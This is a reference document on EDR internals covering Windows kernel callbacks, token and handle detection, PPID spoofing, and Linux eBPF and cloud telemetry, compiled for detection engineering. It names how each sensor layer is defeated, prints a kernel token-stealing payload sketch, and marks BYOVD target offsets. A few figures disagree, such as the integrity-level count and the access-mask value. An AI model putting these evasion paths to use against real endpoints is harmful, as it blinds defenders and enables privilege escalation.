### Defense Hierarchy: Ranking EDR Sensor Robustness

```
Most Robust (hardest to defeat) ▲
│
│  [1] ETW-TI Provider (kernel emission, AM-PPL protected)
│      → Defeat requires: BYOVD or kernel-mode access
│
│  [2] Kernel Callbacks (PsSet*, ObRegister*, CmRegister*)
│      → Defeat requires: BYOVD (callback array modification)
│
│  [3] Minifilter (fltmgr)
│      → Defeat requires: BYOVD (FLT_INSTANCE unlinking)
│
│  [4] WFP Callout
│      → Defeat requires: admin rights + WFP API abuse
│         (EDRSilencer style — detectable via audit events)
│
│  [5] AM-PPL Service Protection
│      → Defeat requires: BYOVD (EPROCESS protection level modify)
│         or kernel-mode primitive
│
│  [6] User-Mode Hooks (ntdll inline hooks)
│      → Defeat requires: admin rights + ntdll unhook (trivial)
│
│  [7] AMSI Provider
│      → Defeat requires: user rights + VEH/patch (medium)
│
Most Fragile (easiest to defeat) ▼
```

### The Fundamental Asymmetry

The attacker must defeat **all** layers. The defender wins by detecting at **any** layer.

This asymmetry favors the defender — except when BYOVD is in play, where a single vulnerable signed driver can blind all kernel-layer sensors simultaneously. This is why the **Vulnerable Driver Blocklist** and **HVCI** are existential mitigations for modern EDR architecture.

---

## Appendix A: Key Kernel Structures Reference

```c
// EPROCESS (partial, offsets approximate for W11 22H2)
typedef struct _EPROCESS {
    // +0x000: KPROCESS (embedded)
    // +0x3D8: InstrumentationCallback (Nirvana)
    // ...
    // +0x440: UniqueProcessId
    // +0x448: ActiveProcessLinks
    // ...
    // +0x520: PEB
    // ...
    // +0x87A: Protection (PS_PROTECTION)
    // +0x87C: SignatureLevel
    // +0x87D: SectionSignatureLevel
    // ...
    // +0x1F0: Flags3 (bits 24/25 = EnableRead/WriteVmLogging)
} EPROCESS;

// OB_CALLBACK_ENTRY (undocumented, reconstructed)
typedef struct _OB_CALLBACK_ENTRY {
    LIST_ENTRY                  CallbackList;
    OB_OPERATION                Operations;
    BOOLEAN                     Enabled;        // ← BYOVD target
    struct _OBJECT_TYPE         *ObjectType;
    POB_PRE_OPERATION_CALLBACK  PreOperation;
    POB_POST_OPERATION_CALLBACK PostOperation;
    PVOID                       RegistrationContext;
} OB_CALLBACK_ENTRY;

// EX_CALLBACK (used in PspCreateProcessNotifyRoutine array)
typedef struct _EX_CALLBACK_ROUTINE_BLOCK {
    EX_RUNDOWN_REF      RundownProtect;
    PEX_CALLBACK_FUNCTION Function;            // ← actual callback address
    PVOID               Context;
} EX_CALLBACK_ROUTINE_BLOCK;
// Array entry = (EX_CALLBACK_ROUTINE_BLOCK*)(array_entry & ~0xF)
```

---

## Appendix B: Detection Techniques Summary Table

| Technique | EDR Sensor | Evasion | Counter-Evasion |
|-----------|-----------|---------|----------------|
| CreateRemoteThread injection | Thread callback + ObCallback | APC injection | ETW-TI QUEUEUSERAPC |
| Process hollowing | PEB check + VAD | Process ghosting | FILE_OBJECT delete flag |
| Direct syscall | ETW-TI callstack, Nirvana | Indirect syscall | Trap frame RIP check |
| Hook removal | Periodic hash check | Module stomping | ETW-TI PROTECTVM |
| LSASS dump | ObRegisterCallbacks | Handle duplication | Pre-callback strips access |
| AMSI bypass (patch) | Memory scan | VEH hardware breakpoint | NtContinue debug reg check |
| ETW-TI disabling | Integrity monitor | Per-GUID flag clear | CmRegisterCallback (registry) |
| WFP block | Audit event 5447 | Sublayer weight override | Max-weight permit callout |
| BYOVD | Blocklist, HVCI | New CVEs | HVCI data-only isolation |
| Sleep obfuscation | PROTECTVM frequency | Randomized timing | Intel TDT behavior |
| Callstack spoof | Unwind validation | ROP desync | Prologue vs unwind consistency |

---

## References

- [blog.deeb.ch — (Anti-)EDR Compendium](https://blog.deeb.ch/posts/how-edr-works/)
- [0xdbgman — EDR Tradecraft: Internals, Detection, Evasion](https://0xdbgman.github.io/posts/edr-internals-research-and-bypass/)
- [n4r1b — Dissecting WdFilter.sys](https://n4r1b.com/posts/2020/01/dissecting-the-windows-defender-driver-wdfilter-part-1/)
- [Elastic Security Labs — Kernel ETW is the Best ETW](https://www.elastic.co/security-labs/kernel-etw-best-etw)
- [Elastic Security Labs — Doubling Down: ETW Callstacks](https://www.elastic.co/security-labs/doubling-down-etw-callstacks)
- [Quarkslab — WdNisDrv.sys Guided Tour](https://blog.quarkslab.com/guided-tour-inside-windefenders-network-inspection-driver.html)
- [EDRSandblast — wavestone-cdt](https://github.com/wavestone-cdt/EDRSandblast)
- [Praetorian — ETW Threat Intelligence and Hardware Breakpoints](https://www.praetorian.com/blog/etw-threat-intelligence-and-hardware-breakpoints/)
- [0xflux — Full Spectrum ETW Detection Against Rootkits](https://fluxsec.red/full-spectrum-event-tracing-for-windows-detection-in-the-kernel-against-rootkits)
- [Alice.climent-pommeret — Direct Syscalls: Hell's/Halo's/SysWhispers2](https://alice.climent-pommeret.red/posts/direct-syscalls-hells-halos-syswhispers2/)
- [FalconForce — MDE Internals 0x02](https://medium.com/falconforce/microsoft-defender-for-endpoint-internals-0x02-audit-settings-and-telemetry-1d0af3ebfb27)
- [CrowdStrike — Kernel Access and Security Architecture](https://www.crowdstrike.com/en-us/blog/tech-analysis-kernel-access-security-architecture/)
- [SCRT Team — Blinding EDRs: WFP Manipulation](https://blog.scrt.ch/2025/08/25/blinding-edrs-a-deep-dive-into-wfp-manipulation/)
- [arxiv:2508.03879 — RX-INT Kernel Engine](https://arxiv.org/html/2508.03879v1)
- [winternl.com — Detecting Manual Syscalls from User Mode](https://winternl.com/detecting-manual-syscalls-from-user-mode/)
- [cirosec.de — Windows Instrumentation Callbacks](https://cirosec.de/en/news/windows-instrumentation-callbacks/)
- [br-sn — Removing Kernel Callbacks Using Signed Drivers](https://br-sn.github.io/Removing-Kernel-Callbacks-Using-Signed-Drivers/)
- [SentinelOne SKREAM](https://github.com/Sentinel-One/SKREAM)
- [Microsoft Security Blog — Intel TDT](https://www.microsoft.com/en-us/security/blog/2021/04/26/defending-against-cryptojacking-with-microsoft-defender-for-endpoint-and-intel-tdt/)
- [ired.team — Kernel Callback Subscription](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/subscribing-to-process-creation-thread-creation-and-image-load-notifications-from-a-kernel-driver)

---

*Document synthesized from primary research: blog.deeb.ch/posts/how-edr-works/, academic papers, Black Hat/DEF CON/BlueHat presentations, public PoC repositories, and kernel reverse engineering findings. Intended for defensive security research and detection engineering.*

---

# EDR Internals: Advanced Topics — Supplement

> Research compiled 2026-06-08. Covers advanced kernel mechanisms, Linux eBPF-based monitoring, hypervisor-level detection, and cloud behavioral analysis. All structure offsets and function names are verified against Windows 11 24H2 symbols unless otherwise noted.

---

## Topic 1 — Token Integrity and Privilege Escalation Detection

### 1.1 The Kernel TOKEN Structure

The `TOKEN` object is the kernel's representation of a security context. Every process and (optionally) every thread carries one. The Vista-era layout (still present through Windows 11 with additions) as recovered from public PDB symbols:

```c
typedef struct _TOKEN {
    TOKEN_SOURCE         TokenSource;          // "ADVAPI  " or driver name
    LUID                 TokenId;              // Unique across boot
    LUID                 AuthenticationId;     // LogonID — ties to logon session
    LUID                 ParentTokenId;        // Creator token's LUID
    LARGE_INTEGER        ExpirationTime;       // -1 means never
    PERESOURCE           TokenLock;            // Reader-writer lock
    LUID                 ModifiedId;           // Incremented on every modification
    SEP_TOKEN_PRIVILEGES Privileges;           // 3 x UINT64 bitmasks
    SEP_AUDIT_POLICY     AuditPolicy;          // Per-token audit override
    ULONG                SessionId;
    ULONG                UserAndGroupCount;
    ULONG                RestrictedSidCount;
    ULONG                VariableLength;
    ULONG                DynamicCharged;
    ULONG                DynamicAvailable;
    ULONG                DefaultOwnerIndex;
    PSID_AND_ATTRIBUTES  UserAndGroups;        // Index 0 is always the user SID
    PSID_AND_ATTRIBUTES  RestrictedSids;
    PVOID                PrimaryGroup;
    PULONG               DynamicPart;
    PACL                 DefaultDacl;
    TOKEN_TYPE           TokenType;            // 1 = Primary, 2 = Impersonation
    SECURITY_IMPERSONATION_LEVEL ImpersonationLevel; // 0-3
    ULONG                TokenFlags;           // TOKEN_HAS_TRAVERSE_PRIVILEGE etc.
    UCHAR                TokenInUse;
    ULONG                IntegrityLevelIndex;  // Index into UserAndGroups array
    ULONG                MandatoryPolicy;      // TOKEN_MANDATORY_POLICY_*
    PSECURITY_TOKEN_PROXY_DATA ProxyData;
    PSECURITY_TOKEN_AUDIT_DATA AuditData;
    PSEP_LOGON_SESSION_REFERENCES LogonSession;
    LUID                 OriginatingLogonSession;
    SID_AND_ATTRIBUTES_HASH SidHash;
    SID_AND_ATTRIBUTES_HASH RestrictedSidHash;
    ULONG                VariablePart;
} TOKEN, *PTOKEN;
```

**Critical offsets on x64 Windows 11** (verify with `dt nt!_TOKEN` in WinDbg):
- `_EPROCESS.Token` — `_EX_FAST_REF` at offset `0x4B8` (Windows 11 24H2). Strip the low 4 bits (ref count) to get the actual token pointer: `token_ptr = eprocess.Token.Value & ~0xF`.
- `_TOKEN.Privileges` — at `TOKEN+0x40`, occupies 24 bytes (3 x UINT64).
- `_TOKEN.IntegrityLevelIndex` — points into `UserAndGroups[]`; the SID at that index encodes the integrity level.

### 1.2 SEP_TOKEN_PRIVILEGES Structure

```c
typedef struct _SEP_TOKEN_PRIVILEGES {
    UINT64 Present;          // Which privileges exist in this token
    UINT64 Enabled;          // Which are currently active
    UINT64 EnabledByDefault; // Which auto-enable at token creation
} SEP_TOKEN_PRIVILEGES, *PSEP_TOKEN_PRIVILEGES;
```

Each UINT64 is a bitmask — bit N corresponds to privilege N+2 (since privileges start at LUID.LowPart = 2).  
Key privilege bit positions:
- `SeCreateTokenPrivilege` = bit 0 (privilege value 2)
- `SeAuditPrivilege` = bit 19 (privilege value 21)
- `SeDebugPrivilege` = bit 18 (privilege value 20)
- `SeTcbPrivilege` = bit 5 (privilege value 7) — "Act as OS"
- `SeLoadDriverPrivilege` = bit 8 (privilege value 10)
- `SeImpersonatePrivilege` = bit 27 (privilege value 29)

**Windows 10 1607+ enforcement**: After this version, the kernel verifies that any bit set in `Enabled` is also set in `Present`. A privilege cannot be enabled without being present. EDR tools exploit this: if `Enabled != 0` but `Present` lacks the same bits, the token has been tampered with.

### 1.3 Token Integrity (Mandatory Integrity Control)

The Windows MIC system (Vista+) maps four well-known integrity levels to SID RIDs:

| Level | RID | SID String | Usage |
|-------|-----|-----------|-------|
| Untrusted | 0x0000 | S-1-16-0 | Sandboxed / restricted |
| Low | 0x1000 | S-1-16-4096 | Protected Mode IE, AppContainers |
| Medium | 0x2000 | S-1-16-8192 | Standard user processes |
| High | 0x3000 | S-1-16-12288 | Elevated (UAC) processes |
| System | 0x4000 | S-1-16-16384 | Windows services, kernel components |

The `TOKEN.IntegrityLevelIndex` field is an index into the `UserAndGroups[]` array. The SID at that position is the integrity label SID. The `TOKEN.MandatoryPolicy` field holds a bitmask from `TOKEN_MANDATORY_POLICY`:
- `TOKEN_MANDATORY_POLICY_OFF` (0x0) — no mandatory policy
- `TOKEN_MANDATORY_POLICY_NO_WRITE_UP` (0x1) — cannot write to higher-IL objects
- `TOKEN_MANDATORY_POLICY_NEW_PROCESS_MIN` (0x2) — children inherit minimum of parent + file IL

**Detection signal**: An attacker elevating IL without going through proper UAC flow will modify `IntegrityLevelIndex` or swap the SID pointer directly. EDR can compare a process's reported integrity (from `NtQueryInformationToken(TokenIntegrityLevel)`) with the ETW-reported value from process creation to detect tampering.

### 1.4 Token Impersonation Detection

**Impersonation mechanics**: Thread-level impersonation allows a thread to temporarily assume a different identity. The kernel stores this in `ETHREAD.ClientSecurity` (`_PS_IMPERSONATION_INFORMATION`), and `ETHREAD.ActiveImpersonationInfo` flag signals an active impersonation.

Key APIs that trigger impersonation (EDR hooks/monitors all of these):
- `NtSetInformationThread(ThreadImpersonationToken)` — directly sets thread token
- `NtImpersonateThread` — copies token from another thread
- `RpcImpersonateClient` / `CoImpersonateClient` — COM/RPC server-side impersonation
- `ImpersonateLoggedOnUser` → internally calls `NtDuplicateToken` + `NtSetInformationThread`
- `SetThreadToken` → `NtSetInformationThread`

**Detection via ObRegisterCallbacks**: EDR registers pre-operation callbacks for `TOKEN` objects. When a handle to a Token is requested (e.g., to duplicate it for theft), the callback fires before the handle is granted. The callback can:
1. Log the `DesiredAccess` and calling process.
2. Strip `TOKEN_DUPLICATE` from the access mask if the caller is not trusted.
3. Deny the handle entirely (`OB_PREOP_ACCESS_DENIED`).

This is the primary mechanism for preventing token theft via `DuplicateTokenEx` + `SetThreadToken`.

### 1.5 Token Theft: The Kernel Attack Path

The classical kernel exploit payload overwrites `EPROCESS.Token`:
```
// Find SYSTEM process (PID 4)
PEPROCESS SystemProcess = PsInitialSystemProcess;
EX_FAST_REF SystemToken = SystemProcess->Token;  // at offset 0x4B8

// Overwrite current process token
PEPROCESS CurrentProcess = PsGetCurrentProcess();
CurrentProcess->Token = SystemToken;
```

**Under HVCI**: This attack still works because it is a *data-only* write — HVCI prevents new unsigned code execution but cannot prevent kernel data structure modification by an exploit with arbitrary write.

**EDR detection of kernel-mode token theft**:
- The `Microsoft-Windows-Threat-Intelligence` ETW provider emits `KERNEL_THREATINT_TASK_PROTECTVM` and `SETTHREADTOKEN` events.
- `CmRegisterCallbackEx` can detect registry writes that typically follow privilege escalation.
- ETW Security event `4672` ("Special privileges assigned to new logon") fires when a new logon session is assigned sensitive privileges — but this does NOT fire for in-memory token swaps, which is a significant gap.
- ETW Security event `4688` ("A new process has been created") records `TokenElevationType` and `MandatoryLabel` — a process with System integrity that spawned from a user-level parent is anomalous.

**The telemetry gap**: No standard Windows mechanism fires an event when `EPROCESS.Token` is directly overwritten at kernel level. EDR solutions address this via periodic enumeration (pull model) or by hooking kernel write gadgets (data watchpoints using hardware debug registers in a hypervisor).

### 1.6 ETW Security Auditing for Privilege Abuse

| Event ID | Provider | Fired When | Fields Useful for Detection |
|----------|---------|-----------|---------------------------|
| 4624 | Security | Successful logon | `ImpersonationLevel`, `ElevatedToken`, `LogonId` |
| 4672 | Security | Special privileges assigned | Privilege list (SeTcbPrivilege, SeDebugPrivilege etc.) |
| 4688 | Security | Process created | `TokenElevationType`, `MandatoryLabel`, `SubjectLogonId` |
| 4703 | Security | Privilege adjusted on token | Which privilege, enable/disable |
| 4657 | Security | Registry value modified | Useful for detecting token-related config changes |

**Privilege audit policy** must be enabled (`AuditPrivilegeUse = Success,Failure`) for event 4703 to fire. EDR products that can run as PPL-Antimalware consume the `Microsoft-Windows-Threat-Intelligence` ETW provider directly, which fires synchronously with the operation and cannot be suppressed by user-mode code.

---

## Topic 2 — Process Tree Reconstruction by EDR

### 2.1 The Problem: PPID Spoofing

User-mode PPID spoofing works via `CreateProcess` with `STARTUPINFOEX.lpAttributeList` containing `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`. This causes:
1. `CreateProcess` internally calls `NtCreateUserProcess`.
2. The handle of the "fake parent" is passed as `ParentProcess` to the syscall.
3. The kernel writes the spoofed PID into `EPROCESS.InheritedFromUniqueProcessId`.

The result: `tasklist /v`, `Process Explorer`, and naive EDR queries see the fake parent. **This does NOT change** `CreatingThreadId` — the actual creating thread's PID is separately tracked.

### 2.2 PS_CREATE_NOTIFY_INFO: The Ground Truth

```c
typedef struct _PS_CREATE_NOTIFY_INFO {
    SIZE_T              Size;
    union {
        ULONG Flags;
        struct {
            ULONG FileOpenNameAvailable : 1;
            ULONG IsSubsystemProcess   : 1;
            ULONG Reserved             : 30;
        };
    };
    HANDLE              ParentProcessId;     // ← the EPROCESS.InheritedFromUniqueProcessId value
    CLIENT_ID           CreatingThreadId;    // ← UniqueProcess = TRUE creator PID, UniqueThread = TID
    struct _FILE_OBJECT *FileObject;
    PCUNICODE_STRING    ImageFileName;
    PCUNICODE_STRING    CommandLine;
    NTSTATUS            CreationStatus;      // Writable: set non-zero to kill the process
} PS_CREATE_NOTIFY_INFO, *PPS_CREATE_NOTIFY_INFO;
```

**Key distinction** (from MSDN, confirmed):
- `ParentProcessId` — "the process ID of the parent process ... not necessarily the same process as the process that created the new process."
- `CreatingThreadId->UniqueProcess` — "the process ID of the process that created the new process."

**PPID spoofing immunity**: If a red team uses `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` to spoof the parent as `explorer.exe`, the callback will show:
- `ParentProcessId` = PID of explorer.exe (spoofed)
- `CreatingThreadId.UniqueProcess` = PID of the actual attacker process (un-spoofable)

An EDR that compares these two fields will immediately identify the discrepancy. This is the primary PPID spoofing detection mechanism.

### 2.3 EPROCESS Fields for Process Lineage

```
EPROCESS
 ├── UniqueProcessId              — This process's PID
 ├── InheritedFromUniqueProcessId — The "parent" PID (spoofable via CreateProcess attribute)
 ├── ActiveProcessLinks           — Doubly-linked list of all processes
 ├── ImageFileName[15]            — Short image name (15 chars max)
 ├── SeAuditProcessCreationInfo   — Full NT image path pointer
 └── Token                        — EX_FAST_REF to TOKEN object
```

**Re-attribution for RPC/WMI-spawned processes**: When `wmiprvse.exe` spawns a process via WMI:
- `ParentProcessId` in the callback = PID of `wmiprvse.exe`
- `CreatingThreadId.UniqueProcess` = PID of `wmiprvse.exe` (legitimate, no discrepancy)

EDR detects the true originator by correlating: which process sent the WMI COM RPC call to `WMI Provider Host`? This requires cross-referencing RPC endpoint calls (via WFP or ETW RPC events) with the subsequent process creation event. CrowdStrike's Falcon, Microsoft Defender for Endpoint, and SentinelOne all implement RPC re-attribution — assigning the "responsible process" to the WMI caller, not `wmiprvse.exe`, in their behavioral graphs.

### 2.4 ETW-Based PPID Spoofing Detection

The `Microsoft-Windows-Kernel-Process` ETW provider emits process creation events that include both the **reported parent PID** and the **actual creating process PID**. Tools like SilkETW and KrabsETW can consume this provider and flag discrepancies.

Detection rule (pseudo-KQL):
```kql
DeviceProcessEvents
| where InitiatingProcessFileName != "expected_parent.exe"
| where ProcessParentId != InitiatingProcessId  // If EDR surfaces both fields
```

---

## Topic 3 — Handle Table Analysis by EDR

### 3.1 HANDLE_TABLE Internals

The Windows handle table is a kernel structure (`_HANDLE_TABLE`) rooted at `EPROCESS.ObjectTable`. Each entry is a `_HANDLE_TABLE_ENTRY`:

```c
typedef struct _HANDLE_TABLE_ENTRY {
    union {
        LONG_PTR  VolatileLowValue;     // Encodes object pointer + attributes
        LONG_PTR  LowValue;
        struct {
            EXHANDLE                Object;
            ULONG_PTR               ObjectPointerBits : 44;  // Pointer to OBJECT_HEADER (>> 4)
        };
    };
    union {
        ULONG_PTR HighValue;
        struct {
            ULONG_PTR               GrantedAccessBits : 25;  // Access mask
            ULONG_PTR               NoRightsUpgrade   : 1;
            ULONG_PTR               Spare1            : 6;
        };
        LONG_PTR  RefCountField;
    };
} HANDLE_TABLE_ENTRY, *PHANDLE_TABLE_ENTRY;
```

The actual kernel object pointer is recovered as: `obj_header = ObjectPointerBits << 4`.

### 3.2 ExEnumHandleTable

`ExEnumHandleTable(PHANDLE_TABLE HandleTable, EX_ENUM_HANDLE_ROUTINE EnumHandleProcedure, PVOID EnumParameter, PHANDLE Handle)` — kernel-only export that iterates all entries in a process's handle table, calling the callback for each valid entry. EDR drivers use this to scan for:
- Handles to `lsass.exe` with `PROCESS_VM_READ` (0x0010) or `PROCESS_ALL_ACCESS` (0x1FFFFF).
- Handles with `THREAD_GET_CONTEXT` / `THREAD_SET_CONTEXT` targeting security-relevant threads.

### 3.3 NtQuerySystemInformation for Handle Enumeration

From user-mode (or from the sensor service):
```c
// SystemHandleInformation class = 16 (0x10)
// Returns array of SYSTEM_HANDLE_ENTRY:
typedef struct _SYSTEM_HANDLE_ENTRY {
    ULONG  ProcessId;
    UCHAR  ObjectTypeNumber;   // Process=7, Thread=8, Token=5 (varies by version)
    UCHAR  Flags;
    USHORT Handle;
    PVOID  Object;             // Kernel object address (for correlation)
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE_ENTRY;
```

`SystemExtendedHandleInformation` (class 64) returns 64-bit handles and additional metadata. EDR sensors periodically call this to identify any process holding a suspicious access mask to `lsass.exe`'s object address.

### 3.4 ObRegisterCallbacks for Handle Auditing

EDR drivers register pre- and post-operation callbacks for `PsProcessType` and `PsThreadType` objects:

```c
OB_OPERATION_REGISTRATION opReg[] = {
    {
        .ObjectType         = PsProcessType,
        .Operations         = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
        .PreOperation       = ProcessHandlePreCallback,
        .PostOperation      = ProcessHandlePostCallback,
    }
};
```

**Pre-operation callback** (`ProcessHandlePreCallback`): Receives `OB_PRE_OPERATION_INFORMATION` containing `Parameters->CreateHandleInformation.DesiredAccess`. The callback can **strip** access rights before the handle is created:
```c
if (IsLsass(ObjectProcess)) {
    Parameters->CreateHandleInformation.GrantedAccess &=
        ~(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION);
}
```

Windows Defender (`WdFilter.sys`) strips `PROCESS_CREATE_THREAD`, `PROCESS_TERMINATE`, `PROCESS_VM_WRITE`, and `PROCESS_VM_OPERATION` from handles targeting protected processes. Confirmed by live analysis: requested `0x1FFFFF` (PROCESS_ALL_ACCESS) is reduced to `0x1FFFD4`.

**Post-operation callback**: Observational only — used for audit logging of what access was actually granted.

### 3.5 Detecting PROCESS_ALL_ACCESS to LSASS

Detection signatures (Sysmon Event ID 10 / WinDefend / Elastic):
- Source process is not `MsMpEng.exe`, `lsass.exe`, or a known-good security tool.
- `GrantedAccess` includes `0x0010` (PROCESS_VM_READ) or `0x0020` (PROCESS_VM_WRITE).
- Object process image name matches `lsass.exe`.

KQL query for MDE advanced hunting:
```kql
DeviceEvents
| where ActionType == "OpenProcess"
| where FileName =~ "lsass.exe"
| where AdditionalFields has "0x1f0fff"  // PROCESS_ALL_ACCESS
| where not(InitiatingProcessFileName in~ ("MsMpEng.exe", "SenseNdr.exe", "csrss.exe"))
| project Timestamp, DeviceName, InitiatingProcessFileName, 
          InitiatingProcessId, AdditionalFields
```

---

## Topic 4 — Linux EDR: eBPF-Based Monitoring

### 4.1 eBPF Architecture for Security

eBPF programs are bytecode loaded into the kernel via the `bpf()` syscall and verified by the kernel's verifier before execution. For security monitoring, four attachment types are critical:

**Kprobes/Kretprobes**: Dynamic instrumentation of any kernel function entry/return. Example: attach to `tcp_v4_connect` to log every outbound TCP connection attempt. Kprobes are fragile — kernel function names can change between versions.

**Tracepoints**: Stable, versioned kernel instrumentation points that maintain API compatibility across kernel versions. The canonical list is at `/sys/kernel/debug/tracing/available_events`. Security-relevant tracepoints:
- `syscalls/sys_enter_*` / `syscalls/sys_exit_*` — one per syscall, fires on every invocation
- `sched/sched_process_exec` — process exec
- `sched/sched_process_fork` — process fork
- `net/net_dev_xmit` — network packet transmission
- `security/security_file_open` — LSM-level file open

**Uprobes**: User-space function instrumentation. Attach to specific offsets in ELF binaries (e.g., `malloc` in `libc.so`). EDR uses this to monitor library calls without modifying user-space code.

**LSM BPF (KRSI)**: The most powerful attachment — BPF programs attached directly to Linux Security Module hook points. Available since kernel 5.7.

### 4.2 Syscall Monitoring: sys_enter/sys_exit Tracepoints

Falco (CNCF) and Tetragon (Cilium) both use `tp/syscalls/sys_enter_*` tracepoints:

```c
// eBPF program for exec monitoring
SEC("tracepoint/syscalls/sys_enter_execve")
int trace_execve(struct trace_event_raw_sys_enter *ctx) {
    struct event_t e = {};
    e.pid = bpf_get_current_pid_tgid() >> 32;
    e.ppid = get_ppid();
    bpf_get_current_comm(&e.comm, sizeof(e.comm));
    // Read argv from user-space pointer in ctx->args[1]
    bpf_probe_read_user_str(e.filename, sizeof(e.filename), 
                            (void *)ctx->args[0]);
    bpf_ringbuf_output(&events, &e, sizeof(e), 0);
    return 0;
}
```

`sys_exit_execve` captures the return value (success/failure) and correlates with the entry event via PID+cookie.

### 4.3 BPF Maps and the Telemetry Pipeline

BPF maps are kernel-managed data structures shared between eBPF programs and user-space daemons:

| Map Type | Use Case |
|---------|---------|
| `BPF_MAP_TYPE_HASH` | Whitelists, PID-to-process-context lookup |
| `BPF_MAP_TYPE_LRU_HASH` | Connection state tracking (auto-evict old entries) |
| `BPF_MAP_TYPE_PERCPU_ARRAY` | Per-CPU statistics without lock contention |
| `BPF_MAP_TYPE_RINGBUF` | Streaming events to user-space (preferred since kernel 5.8) |
| `BPF_MAP_TYPE_PERF_EVENT_ARRAY` | Legacy event streaming (per-CPU ring buffers) |

**BPF_MAP_TYPE_RINGBUF** (introduced kernel 5.8) is the modern standard. It is MPSC (multi-producer single-consumer), supports memory-mapped access from user-space for zero-copy reads, and provides `bpf_ringbuf_reserve()` / `bpf_ringbuf_submit()` for atomic two-phase writes. Falco migrated from perf buffer to ringbuf in its eBPF driver.

### 4.4 BPF CO-RE (Compile Once, Run Everywhere)

Without CO-RE, an eBPF program compiled against one kernel's headers would break on another version if structure layouts changed. CO-RE solves this via BTF (BPF Type Format):

1. The kernel exports its type information in BTF format (accessible via `/sys/kernel/btf/vmlinux`).
2. The eBPF program is compiled with `__attribute__((preserve_access_index))` on relevant structs.
3. At load time, `libbpf` reads the kernel's BTF and applies field-relocation patches to the eBPF bytecode.

This enables a single compiled eBPF binary to run correctly across kernels 5.4 through 6.x even if `struct task_struct` layout changes.

```c
// CO-RE aware field access — libbpf rewrites the offset at load time
#include "vmlinux.h"  // Auto-generated from kernel BTF

SEC("kprobe/do_sys_open")
int BPF_KPROBE(do_sys_open, int dfd, const char *filename, int flags, int mode) {
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    // BPF_CORE_READ handles field relocation automatically
    pid_t pid = BPF_CORE_READ(task, tgid);
    ...
}
```

### 4.5 LSM Hooks: KRSI (Kernel Runtime Security Instrumentation)

KRSI (kernel 5.7+) allows BPF programs of type `BPF_PROG_TYPE_LSM` to attach to any of the ~200 LSM hook points. Unlike informational tracepoints, LSM BPF programs can **enforce policy** by returning non-zero to deny an operation.

Key LSM hooks used by Linux EDR:

| Hook | Trigger | EDR Use |
|------|---------|--------|
| `bprm_check_security` | Before exec | Block execution of unsigned/untrusted binaries |
| `task_kill` | Before signal delivery | Detect/block kill(SIGKILL) targeting security agents |
| `file_open` | File open attempt | Monitor sensitive file access (`/etc/shadow`, `/proc/*/mem`) |
| `socket_connect` | Outbound connection | Log C2 connections with process attribution |
| `socket_bind` | Port binding | Detect backdoor listeners |
| `mmap` | Memory mapping | Detect executable anonymous mappings (shellcode injection) |
| `ptrace_access_check` | Before ptrace | Detect process injection / debugging |
| `inode_rename` | File rename | Detect ransomware staging |

**Activation**: KRSI requires the kernel built with `CONFIG_BPF_LSM=y` and the `lsm=` boot parameter must include `bpf`:
```
lsm=lockdown,yama,loadpin,safesetid,integrity,selinux,bpf
```

### 4.6 fanotify vs inotify for File Monitoring

| Feature | `inotify` | `fanotify` |
|---------|---------|---------|
| Granularity | Per-inode watch | Per-mount or per-filesystem |
| Can block? | No | Yes (with `FAN_ACCESS_PERM`, `FAN_OPEN_EXEC_PERM`) |
| File content access? | No | Yes — EDR can read the file before allowing |
| Kernel version | 2.6.13 | 2.6.36 (permission events: 3.1+) |
| Path info? | Limited | Full path via `/proc/self/fd` trick or kernel 5.1+ `FAN_REPORT_NAME` |
| Recursive watches? | No (manual) | Yes (whole mount) |

Modern Linux EDR (Elastic Endpoint, SentinelOne Linux) uses `fanotify` with `FAN_OPEN_EXEC_PERM` for real-time binary execution monitoring, allowing the sensor to scan file content (malware scanning) before `execve` completes. `inotify` is only used for simple file change detection where blocking is not required.

### 4.7 seccomp-BPF for Syscall Filtering

`seccomp(SECCOMP_SET_MODE_FILTER, ...)` loads a BPF program that acts as a syscall filter. Unlike security monitoring eBPF programs, seccomp-BPF filters run in a restricted environment and can only:
- Allow (`SECCOMP_RET_ALLOW`)
- Kill the thread/process (`SECCOMP_RET_KILL`)
- Send SIGSYS with info (`SECCOMP_RET_TRAP`)
- Trace via ptrace (`SECCOMP_RET_TRACE`)
- Log to audit (`SECCOMP_RET_LOG`)

EDR uses seccomp-BPF to lock down its own agent process (preventing attackers from injecting new syscalls) and to implement sandbox policies for monitored processes.

### 4.8 Vendor eBPF Implementations

| Vendor | Technology | Notes |
|--------|-----------|-------|
| **Falco** (CNCF) | `sys_enter`/`sys_exit` tracepoints + kernel module fallback | Ring buffer-based; rules engine in user space |
| **Tetragon** (Cilium/Isovalent) | Kprobes + tracepoints + LSM BPF | In-kernel filtering/enforcement via `bpf_map`; can kill processes from BPF |
| **Elastic Endpoint** | `fanotify` + kprobes + BTF CO-RE | File-integrity monitoring uses fanotify; process monitoring uses kprobes |
| **SentinelOne** | Kprobes + tracepoints + uprobes | Kernel module + eBPF hybrid for older kernel compatibility |
| **CrowdStrike Falcon** | Kernel module (primary) + eBPF for newer kernels | Module-based on older distros; eBPF for RHEL 8.6+/Ubuntu 22.04+ |

---

## Topic 5 — Cloud Correlation and Behavioral Graph Analysis

### 5.1 Behavioral Event Graph Construction

Modern EDR backends construct a **provenance graph** from endpoint telemetry. The graph model:
- **Nodes**: Processes, files, network endpoints, registry keys, users
- **Edges**: Events — process creation (parent→child), file write (process→file), network connection (process→IP:port), registry write (process→key)
- **Node attributes**: Hash, signature, integrity level, process lineage
- **Edge attributes**: Timestamp, access mask, operation result

Each node carries a globally unique identifier (typically SHA256 of device_id + pid + create_time) to enable cross-machine correlation in APT scenarios.

### 5.2 MITRE ATT&CK Automatic Tagging

EDR backends map raw telemetry events to ATT&CK techniques through rule engines. The tagging pipeline:
1. **Event normalization**: Convert raw events (process create, file write, network) to a common schema.
2. **Sigma-rule matching**: Open-standard detection rules that compile to backend-specific query languages (KQL, SPL, YARA-L).
3. **TTP tagging**: Matched events receive ATT&CK technique IDs (e.g., T1055 for process injection, T1003.001 for LSASS credential access).
4. **Graph annotation**: The behavioral graph node/edge receives the TTP tag.

